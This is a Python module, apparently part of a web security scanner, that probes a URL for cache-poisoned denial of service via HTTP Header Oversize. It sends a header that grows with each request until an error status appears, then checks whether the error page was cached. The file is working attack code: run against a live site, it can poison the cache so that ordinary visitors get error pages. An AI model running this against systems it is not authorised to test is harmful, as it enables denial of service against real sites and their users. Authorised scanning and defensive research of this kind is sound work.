#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Header Oversize (HHO)
https://cpdos.org/#HHO
"""

from modules.utils import requests, configure_logger, human_time

logger = configure_logger(__name__)

VULN_NAME = "HTTP Header Oversize"

def HHO(url, s, main_response, authent, human):
    """
    Perform a Header Oversize Denial of Service (HHO DOS) attack on the given URL.

    This function attempts to detect and confirm a vulnerability by sending oversized headers
    to the target URL and observing the response status codes. If a specific error status code
    is detected, it indicates a potential vulnerability.

    Args:
        url (str): The target URL to test.
        s (requests.Session): The session object to use for making requests.
        main_response (requests.Response): The initial response from the target URL.
        authent (tuple): Authentication credentials (username, password) for the target URL.

    Returns:
        None
    """
    error_detected = False
    max_iterations = 200
    iteration = 0
    main_status_code = main_response.status_code

    big_value = "Big-Value-0"

    while iteration < max_iterations and not error_detected:
        big_value = big_value + "0" * 50
        h = {f"X-Oversized-Header-{iteration}": f"{big_value}"}

        try:
            probe = s.get(
                url, headers=h, auth=authent, allow_redirects=False, verify=False, timeout=10
            )

            logger.debug(
                "STATUS (%s)\nHeaders :(%s)",
                probe.status_code,
                h,
            )

            if (
                probe.status_code in [400, 413, 500, 502]
                and probe.status_code != main_status_code
            ):
                logger.debug(
                    "CPDOS : URL (%s) STATUS (%s) Headers :(%s)",
                    url,
                    probe.status_code,
                    probe.headers,
                )
                error_detected = True
            iteration += 1
            human_time(human)

            print(
                f" \033[34m {VULN_NAME} : X-Oversized-Header-{iteration}\033[0m\r",
                end="",
            )
            print("\033[K", end="")

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)

    if error_detected:
        try:
            verify = s.get(url, auth=authent, allow_redirects=False, verify=False, timeout=10)
            if (
                verify.status_code in [400, 413, 500, 502]
                and verify.status_code != main_status_code
            ):
                reason = f"DIFFERENT STATUS-CODE {main_status_code} > {verify.status_code}"
                status = "\033[31m└── [VULNERABILITY CONFIRMED]\033[0m"
            else:
                reason = f"DIFFERENT STATUS-CODE {main_status_code} > {probe.status_code}"
                status = "\033[33m└── [INTERESTING BEHAVIOR]\033[0m"
            print(f" {status} | HHO DOS | \033[34m{url}\033[0m | {reason} | PAYLOAD: X-Oversized-Header-x: Big-Value-0*{len(big_value) - len('Big-Value-0')}")

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)
